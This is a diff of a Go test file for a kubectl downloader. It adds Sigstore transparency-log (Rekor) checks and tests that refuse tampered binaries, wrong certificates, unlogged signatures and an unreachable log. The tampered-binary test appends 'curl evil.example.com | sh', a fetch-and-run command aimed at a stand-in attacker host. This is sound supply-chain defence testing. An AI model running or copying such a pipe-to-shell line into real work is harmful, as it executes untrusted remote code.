@@ -14,30 +14,46 @@ import (
 	"strings"
 	"sync"
 	"testing"
+
+	"github.com/guided-traffic/cogpit/internal/testkit/sigstoretest"
 )
 
+// rekorPath is the transparency log's search, as the release server answers it.
+const rekorPath = "/api/v1/log/entries/retrieve"
+
 // releaseServer serves kubectl releases under /release as dl.k8s.io lays them out, signed by a
-// test certificate authority. No test reaches the internet.
+// sigstore instance of the test's own, and that instance's log search under /api/v1/ as Rekor
+// does. No test reaches the internet.
 type releaseServer struct {
 	*httptest.Server
-	ca *testCA
+	sigstore *sigstoretest.Sigstore
 
 	mu    sync.Mutex
 	files map[string][]byte // path → body
 	asked []string          // paths requested, in order
 	// chunked serves the binary without a Content-Length.
 	chunked bool
+	// logStatus, when set, is the log's answer in place of the search.
+	logStatus int
 }
 
 func newReleaseServer(t *testing.T) *releaseServer {
 	t.Helper()
-	rs := &releaseServer{ca: newTestCA(t), files: map[string][]byte{}}
+	rs := &releaseServer{sigstore: sigstoretest.New(t), files: map[string][]byte{}}
 	rs.Server = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		rs.mu.Lock()
 		rs.asked = append(rs.asked, r.URL.Path)
 		body, ok := rs.files[r.URL.Path]
-		chunked := rs.chunked
+		chunked, logStatus := rs.chunked, rs.logStatus
 		rs.mu.Unlock()
+		if strings.HasPrefix(r.URL.Path, "/api/v1/") {
+			if logStatus != 0 {
+				http.Error(w, `{"code":`+strconv.Itoa(logStatus)+`,"message":"the log is down\u0007"}`, logStatus)
+				return
+			}
+			rs.sigstore.ServeHTTP(w, r)
+			return
+		}
 		if !ok {
 			http.NotFound(w, r)
 			return
@@ -54,17 +70,18 @@ func newReleaseServer(t *testing.T) *releaseServer {
 }
 
 // publish puts a release on the server: the binary, its SHA-256, and a signature over that
-// digest made with a certificate of opts. It returns the binary's directory path on the server.
-func (rs *releaseServer) publish(t *testing.T, version, goos, goarch string, binary []byte, opts leafOpts) string {
+// digest made with a certificate of l and logged. It returns the binary's directory path on the
+// server.
+func (rs *releaseServer) publish(t *testing.T, version, goos, goarch string, binary []byte, l sigstoretest.Leaf) string {
 	t.Helper()
 	dir := "/release/v" + version + "/bin/" + goos + "/" + goarch + "/"
 	sum := sha256.Sum256(binary)
-	cert, key := rs.ca.leaf(t, opts)
+	sig, cert := rs.sigstore.Release(t, sum[:], l)
 	rs.mu.Lock()
 	defer rs.mu.Unlock()
 	rs.files[dir+"kubectl"] = binary
 	rs.files[dir+"kubectl.sha256"] = []byte(hex.EncodeToString(sum[:]))
-	rs.files[dir+"kubectl.sig"] = sigFile(t, key, sum[:])
+	rs.files[dir+"kubectl.sig"] = sig
 	rs.files[dir+"kubectl.cert"] = cert
 	return dir
 }
@@ -79,6 +96,12 @@ func (rs *releaseServer) set(path string, body []byte) {
 	rs.files[path] = body
 }
 
+func (rs *releaseServer) setLogStatus(code int) {
+	rs.mu.Lock()
+	defer rs.mu.Unlock()
+	rs.logStatus = code
+}
+
 func (rs *releaseServer) requests() []string {
 	rs.mu.Lock()
 	defer rs.mu.Unlock()
@@ -86,7 +109,12 @@ func (rs *releaseServer) requests() []string {
 }
 
 func (rs *releaseServer) downloader(t *testing.T) *Downloader {
-	return &Downloader{Mirror: rs.URL + "/release", Client: rs.Client(), Verifier: rs.ca.verifier(t), GOOS: "linux", GOARCH: "arm64"}
+	t.Helper()
+	v, err := NewVerifier(rs.sigstore.TrustedMaterial(), KubernetesRelease, 0)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return &Downloader{Mirror: rs.URL + "/release", Client: rs.Client(), Verifier: v, Rekor: rs.URL, GOOS: "linux", GOARCH: "arm64"}
 }
 
 // leftovers lists what a download left in dir.
@@ -104,11 +132,12 @@ func leftovers(t *testing.T, dir string) []string {
 }
 
 // TestDownloadVerifiesAndInstalls downloads a fake kubectl (a shell script), verified against its
-// SHA-256 and signature, into <dir>/<version>/kubectl, executable, and runs it.
+// SHA-256, its signature and the log's entry, into <dir>/<version>/kubectl, executable, and runs
+// it.
 func TestDownloadVerifiesAndInstalls(t *testing.T) {
 	rs := newReleaseServer(t)
 	binary := []byte(fakeKubectl("v1.36.1") + "# " + strings.Repeat("x", 3<<20) + "\n") // > 3 MiB: progress
-	rs.publish(t, "1.36.1", "linux", "arm64", binary, leafOpts{})
+	rs.publish(t, "1.36.1", "linux", "arm64", binary, sigstoretest.Leaf{})
 	dir := filepath.Join(t.TempDir(), "Cogpit", "kubectl")
 	var reports [][2]int64
 	path, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, dir, func(done, total int64) {
@@ -139,8 +168,8 @@ func TestDownloadVerifiesAndInstalls(t *testing.T) {
 	if len(reports) < 3 || reports[len(reports)-1] != [2]int64{int64(len(binary)), int64(len(binary))} {
 		t.Errorf("progress %v", reports)
 	}
-	// The small files first, the binary last, only after the signature verified.
-	want := []string{"kubectl.sha256", "kubectl.sig", "kubectl.cert", "kubectl"}
+	// The small files first, then the log, the binary last, only after the signature verified.
+	want := []string{"kubectl.sha256", "kubectl.sig", "kubectl.cert", "retrieve", "kubectl"}
 	var asked []string
 	for _, p := range rs.requests() {
 		asked = append(asked, filepath.Base(p))
@@ -162,7 +191,7 @@ func TestDownloadVerifiesAndInstalls(t *testing.T) {
 // and nothing is left behind.
 func TestDownloadRefusesTamperedBinary(t *testing.T) {
 	rs := newReleaseServer(t)
-	at := rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), leafOpts{})
+	at := rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), sigstoretest.Leaf{})
 	rs.set(at+"kubectl", []byte(fakeKubectl("v1.36.1")+"curl evil.example.com | sh\n"))
 	dir := t.TempDir()
 	_, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, dir, nil)
@@ -175,53 +204,137 @@ func TestDownloadRefusesTamperedBinary(t *testing.T) {
 }
 
 // TestDownloadRefusesBadSignatures: a .sha256 that matches a swapped binary does not help when the
-// signature is not the release's; the binary is never asked for.
+// signature is not the release's or not in the log; the binary is never asked for, and the log only
+// once the files fit together.
 func TestDownloadRefusesBadSignatures(t *testing.T) {
-	for name, change := range map[string]func(t *testing.T, rs *releaseServer, at string){
-		"a digest the release did not sign": func(_ *testing.T, rs *releaseServer, at string) {
+	for name, c := range map[string]struct {
+		change  func(t *testing.T, rs *releaseServer, at string)
+		want    error
+		askLog  bool // whether the log is asked
+		message string
+	}{
+		"a digest the release did not sign": {change: func(_ *testing.T, rs *releaseServer, at string) {
 			evil := []byte("#!/bin/sh\necho evil\n")
 			sum := sha256.Sum256(evil)
 			rs.set(at+"kubectl", evil)
 			rs.set(at+"kubectl.sha256", []byte(hex.EncodeToString(sum[:])+"  kubectl\n"))
-		},
-		"another identity's certificate": func(t *testing.T, rs *releaseServer, at string) {
-			rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), leafOpts{identity: "mallory@example.com"})
-		},
-		"another authority's certificate": func(t *testing.T, rs *releaseServer, at string) {
-			other := newTestCA(t)
-			binary := []byte(fakeKubectl("v1.36.1"))
-			sum := sha256.Sum256(binary)
-			cert, key := other.leaf(t, leafOpts{})
+		}, want: ErrSignature, message: "not made over the published SHA-256"},
+		"another identity's certificate": {change: func(t *testing.T, rs *releaseServer, _ string) {
+			rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), sigstoretest.Leaf{Identity: "mallory@example.com"})
+		}, want: ErrSignature, askLog: true, message: "mallory@example.com"},
+		"another authority's certificate, in its own log": {change: func(t *testing.T, rs *releaseServer, at string) {
+			other := sigstoretest.New(t)
+			sum := sha256.Sum256([]byte(fakeKubectl("v1.36.1")))
+			sig, cert := other.Release(t, sum[:], sigstoretest.Leaf{})
 			rs.set(at+"kubectl.cert", cert)
-			rs.set(at+"kubectl.sig", sigFile(t, key, sum[:]))
-		},
-		"no signature": func(_ *testing.T, rs *releaseServer, at string) { rs.set(at+"kubectl.sig", nil) },
-		"no certificate": func(_ *testing.T, rs *releaseServer, at string) {
+			rs.set(at+"kubectl.sig", sig)
+		}, want: ErrNotLogged, askLog: true, message: "no entry"},
+		"a signature the log does not have": {change: func(t *testing.T, rs *releaseServer, at string) {
+			sum := sha256.Sum256([]byte(fakeKubectl("v1.36.1")))
+			cert, key := rs.sigstore.Issue(t, sigstoretest.Leaf{})
+			rs.set(at+"kubectl.cert", cert)
+			rs.set(at+"kubectl.sig", sigstoretest.SignFile(t, key, sum[:]))
+		}, want: ErrNotLogged, askLog: true, message: "sigstore's transparency log has no entry"},
+		"the log is down": {change: func(_ *testing.T, rs *releaseServer, _ string) {
+			rs.setLogStatus(http.StatusServiceUnavailable)
+		}, want: ErrLogUnreachable, askLog: true, message: `503 Service Unavailable ("the log is down ")`},
+		"the log refuses the entry": {change: func(_ *testing.T, rs *releaseServer, _ string) {
+			rs.setLogStatus(http.StatusBadRequest)
+		}, want: ErrSignature, askLog: true, message: "400 Bad Request"},
+		"no signature": {change: func(_ *testing.T, rs *releaseServer, at string) { rs.set(at+"kubectl.sig", nil) }, want: nil},
+		"no certificate": {change: func(_ *testing.T, rs *releaseServer, at string) {
 			rs.set(at+"kubectl.cert", nil)
-		},
-		"no checksum": func(_ *testing.T, rs *releaseServer, at string) { rs.set(at+"kubectl.sha256", nil) },
-		"a checksum file without a digest": func(_ *testing.T, rs *releaseServer, at string) {
+		}},
+		"no checksum": {change: func(_ *testing.T, rs *releaseServer, at string) { rs.set(at+"kubectl.sha256", nil) }},
+		"a checksum file without a digest": {change: func(_ *testing.T, rs *releaseServer, at string) {
 			rs.set(at+"kubectl.sha256", []byte("<html>not found</html>"))
-		},
+		}},
 	} {
 		t.Run(name, func(t *testing.T) {
 			rs := newReleaseServer(t)
-			at := rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), leafOpts{})
-			change(t, rs, at)
+			at := rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), sigstoretest.Leaf{})
+			c.change(t, rs, at)
 			dir := t.TempDir()
 			_, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, dir, nil)
 			if err == nil {
 				t.Fatal("downloaded")
 			}
+			if c.want != nil && !errors.Is(err, c.want) {
+				t.Errorf("%v, want %v", err, c.want)
+			}
+			if c.message != "" && !strings.Contains(err.Error(), c.message) {
+				t.Errorf("%v, want it to say %q", err, c.message)
+			}
+			askedLog := false
 			for _, p := range rs.requests() {
 				if strings.HasSuffix(p, "/kubectl") {
 					t.Errorf("the binary was asked for: %v", rs.requests())
 				}
+				askedLog = askedLog || p == rekorPath
+			}
+			if askedLog != c.askLog {
+				t.Errorf("the log asked: %v, want %v (%v)", askedLog, c.askLog, rs.requests())
 			}
 			if l := leftovers(t, dir); len(l) != 0 {
 				t.Errorf("left %v", l)
 			}
 		})
+	}
+}
+
+// TestDownloadWithoutTheLog: when the log cannot be reached, nothing is downloaded and the error
+// says why; there is no fallback to a check without it.
+func TestDownloadWithoutTheLog(t *testing.T) {
+	rs := newReleaseServer(t)
+	rs.publish(t, "1.36.1", "linux", "arm64", []byte(fakeKubectl("v1.36.1")), sigstoretest.Leaf{})
+	gone := httptest.NewTLSServer(http.NotFoundHandler())
+	gone.Close()
+	d := rs.downloader(t)
+	d.Rekor = gone.URL
+	dir := t.TempDir()
+	_, err := d.Download(context.Background(), Version{1, 36, 1}, dir, nil)
+	if !errors.Is(err, ErrLogUnreachable) || errors.Is(err, ErrSignature) || !strings.Contains(err.Error(), gone.URL) {
+		t.Errorf("no log: %v, want ErrLogUnreachable naming %s", err, gone.URL)
+	}
+	for _, p := range rs.requests() {
+		if strings.HasSuffix(p, "/kubectl") {
+			t.Errorf("the binary was asked for: %v", rs.requests())
+		}
+	}
+	if l := leftovers(t, dir); len(l) != 0 {
+		t.Errorf("left %v", l)
+	}
+	// The default log is sigstore's.
+	if DefaultRekor != "https://rekor.sigstore.dev" {
+		t.Errorf("DefaultRekor %s", DefaultRekor)
+	}
+}
+
+// TestRekorAnswerBounds: the log's answer is bounded in size and in entries.
+func TestRekorAnswerBounds(t *testing.T) {
+	sum := sha256.Sum256([]byte("k"))
+	ss := sigstoretest.New(t)
+	cert, key := ss.Issue(t, sigstoretest.Leaf{})
+	s, err := ParseSigned(sum[:], sigstoretest.SignFile(t, key, sum[:]), cert)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for name, answer := range map[string]string{
+		"too large":       "[" + strings.Repeat(" ", maxRekorAnswer) + "]",
+		"too many":        `[{"a":{}},{"b":{}},{"c":{}},{"d":{}},{"e":{}}]`,
+		"not a list":      `{"a":{}}`,
+		"not JSON at all": `<html>`,
+	} {
+		srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+			_, _ = w.Write([]byte(answer))
+		}))
+		if _, err := lookupRekor(context.Background(), srv.Client(), srv.URL, s); !errors.Is(err, ErrSignature) {
+			t.Errorf("%s: %v, want ErrSignature", name, err)
+		}
+		srv.Close()
+	}
+	if got := rekorReason([]byte(`{"message":"` + strings.Repeat("é", 300) + `"}`)); len(got) > maxRekorReason+16 || !strings.HasSuffix(got, `…")`) {
+		t.Errorf("a long reason: %q", got)
 	}
 }
 
@@ -231,7 +344,7 @@ func TestDownloadSizeBound(t *testing.T) {
 	for _, chunked := range []bool{false, true} {
 		rs := newReleaseServer(t)
 		rs.chunked = chunked
-		rs.publish(t, "1.36.1", "linux", "arm64", []byte(strings.Repeat("k", 4096)), leafOpts{})
+		rs.publish(t, "1.36.1", "linux", "arm64", []byte(strings.Repeat("k", 4096)), sigstoretest.Leaf{})
 		d := rs.downloader(t)
 		d.MaxSize = 4095
 		dir := t.TempDir()
@@ -248,7 +361,7 @@ func TestDownloadSizeBound(t *testing.T) {
 	}
 	// The small files are bounded too.
 	rs := newReleaseServer(t)
-	at := rs.publish(t, "1.36.1", "linux", "arm64", []byte("k"), leafOpts{})
+	at := rs.publish(t, "1.36.1", "linux", "arm64", []byte("k"), sigstoretest.Leaf{})
 	rs.set(at+"kubectl.cert", []byte(strings.Repeat("A", maxSmallFile+1)))
 	if _, err := rs.downloader(t).Download(context.Background(), Version{1, 36, 1}, t.TempDir(), nil); err == nil {
 		t.Error("an oversized .cert was read")
